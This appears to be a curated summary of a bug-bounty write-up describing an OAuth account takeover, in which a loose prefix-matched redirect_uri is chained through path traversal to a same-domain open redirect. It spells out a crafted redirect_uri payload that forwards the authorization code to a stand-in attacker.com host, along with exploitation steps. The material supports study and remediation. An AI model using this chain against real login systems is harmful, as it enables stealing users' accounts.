# $8k OAuth ATO: loose prefix-match redirect_uri + a same-domain open redirect leaks the auth code via path traversal

- **Vuln type / sub-variant:** OAuth 2.0 redirect_uri validation bypass (loose prefix match, not exact) chained with a same-domain open redirect, leaking the authorization code to the attacker, leading to account takeover
- **Target type:** enterprise analytics platform with SSO login via a third-party identity provider (authorization-code flow, no PKCE)
- **Recon signal:** the authorize request carries an attacker-reachable `redirect_uri=https://analytics.platform.com/auth/callback`; worth probing how strictly the IdP matches it, and whether the client domain hosts any `/redirect`-style open-redirect utility to chain
- **Root cause:** the IdP validated `redirect_uri` with a loose domain/prefix match instead of exact string matching, so any value that merely starts with the registered callback prefix is accepted; the client app also exposes an open-redirect endpoint reachable by path traversal from the callback path, and the flow has no PKCE to bind the code
- **Exploitation steps:**
  1. Confirm naive bypasses fail: full domain swap and arbitrary subdomain are both rejected (exact-ish host check).
  2. Keep the registered prefix but append a traversal to the client's open redirect: `redirect_uri=https://analytics.platform.com/auth/callback/../../redirect?url=https://attacker.com`. The prefix match passes.
  3. Victim clicks the crafted authorize link; the IdP authenticates them and 302s the code back to that redirect_uri (code appended to the query).
  4. The client router resolves `/auth/callback/../../redirect` to its `/redirect` open-redirect utility, preserving the query string, so the browser is forwarded to the attacker domain with `?url=...&code=AUTH_CODE_LEAKED`.
  5. The attacker reads the code from their server logs and submits it to the legitimate `/auth/callback` to obtain the victim's session.
- **Bypasses used:** prefix/substring redirect_uri match defeated by keeping the allowed prefix and appending `/../` path traversal into a same-domain open redirect; absence of PKCE lets the stolen code be redeemed
- **Impact:** complete account takeover of any victim who clicks the link, no credentials or further interaction; High/Critical
- **Bounty:** $8,000 (triaged in 1 hour)
- **Lesson / pattern:** redirect_uri must be matched by exact string, never a prefix or domain substring; a loose match plus any same-domain open redirect reachable by `/../` is full ATO, so test path traversal and matrix params inside redirect URIs and always check whether PKCE is enforced to neutralize intercepted codes.
- **Source:**
  - Title: How an OAuth 2.0 Redirect URI Bypass Led to Account Takeover and an $8,000 Bounty
  - Author: t4nv1
  - URL: https://medium.com/@t4nv1/how-an-oauth-2-0-redirect-uri-bypass-led-to-account-takeover-and-an-8-000-bounty-ad67ba4b0db6
  - Date: 2026-08-27
  - Disclosed report: none (member-only Medium; user-supplied full article)
  - Raw file: `sources/access-control/19-medium-t4nv1-oauth-redirect-ato.md`

Tags: oauth, redirect-uri, prefix-match, path-traversal, open-redirect, authorization-code-leak, pkce, account-takeover, chain
